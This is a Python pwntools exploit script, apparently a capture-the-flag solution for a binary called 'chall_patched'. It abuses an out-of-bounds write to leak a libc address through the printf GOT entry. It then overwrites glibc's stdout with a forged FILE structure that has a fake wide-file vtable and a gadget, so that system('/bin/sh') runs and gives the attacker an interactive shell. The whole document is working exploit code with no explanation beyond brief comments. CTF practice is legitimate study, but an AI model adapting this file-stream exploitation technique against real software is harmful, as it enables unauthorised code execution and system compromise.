#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
gdb.attach(p,gdbscript='''
           b*0x000000000040132A
           b*0x00000000004013CD
           b*0x000000000040140F
           ''')
input()
p.sendline(b'-1')
p.sendline(b'1')
p.sendline(str(exe.sym.book))
p.send(p64(exe.got.printf))
input()
p.sendline(b'2')
p.recvuntil(b'your book: ')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym.printf 
log.info(f'libc.address: {hex(libc.address)}')

input()
p.sendline(b'1')
p.sendline(str(exe.sym.book - exe.got.printf))  # offset from stdout to book
p.send(p64(libc.address))
input()

p.sendline(b'1')

stdout_lock = libc.address +  0x205710
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

# our gadget
gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout

p.sendline(str(libc.sym._IO_2_1_stdout_ - libc.address))
p.send(bytes(fake))
p.interactive()
